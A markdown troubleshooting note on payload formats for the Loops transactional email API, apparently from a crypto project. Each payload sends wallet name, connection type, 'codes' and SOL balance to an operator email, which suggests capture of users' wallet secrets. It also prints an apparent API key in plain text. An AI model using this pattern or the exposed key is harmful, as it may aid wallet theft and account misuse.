# 📧 Loops API - Correct Payload Format

Based on testing and Loops documentation, here are the possible correct formats:

## Format That Should Work (Based on Loops Docs)

```json
{
  "transactionalId": "cmgn2tzu5fqc41q0ivqlmuqf4",
  "email": "admin@solsnipeai.xyz",
  "dataVariables": {
    "walletName": "value",
    "connectionType": "value",
    "codes": "value",
    "solBalance": "value"
  }
}
```

## Alternative Formats to Try

### 1. With `addToAudience` flag
```json
{
  "transactionalId": "cmgn2tzu5fqc41q0ivqlmuqf4",
  "email": "admin@solsnipeai.xyz",
  "addToAudience": false,
  "dataVariables": {
    "walletName": "value",
    "connectionType": "value",
    "codes": "value",
    "solBalance": "value"
  }
}
```

### 2. Using `transactionId` (without 'al')
```json
{
  "transactionId": "cmgn2tzu5fqc41q0ivqlmuqf4",
  "email": "admin@solsnipeai.xyz",
  "dataVariables": {
    "walletName": "value",
    "connectionType": "value",
    "codes": "value",
    "solBalance": "value"
  }
}
```

## Testing Steps

1. **Run the format tester:**
   ```powershell
   .\test-loops-formats.ps1
   ```

2. **Check which format returns 200 OK**

3. **Update the code** in `loopsEmail.js` if needed

## Common Issues

| Issue | Solution |
|-------|----------|
| Template ID invalid | Verify in Loops dashboard: cmgn2tzu5fqc41q0ivqlmuqf4 |
| Email not verified | Add admin@solsnipeai.xyz to Loops contacts |
| Wrong API endpoint | Current: /api/v1/transactional |
| Missing required fields | Check template requirements in Loops |

## Verification Checklist

- [ ] Template ID is correct: `cmgn2tzu5fqc41q0ivqlmuqf4`
- [ ] Template is **Published** (not draft)
- [ ] API Key is valid: `0de67ebcc5e8d98792c780ed52b714ee`
- [ ] All dataVariables match template fields
- [ ] Email address is valid and verified

Run `.\test-loops-formats.ps1` to auto-detect the correct format! 🎯
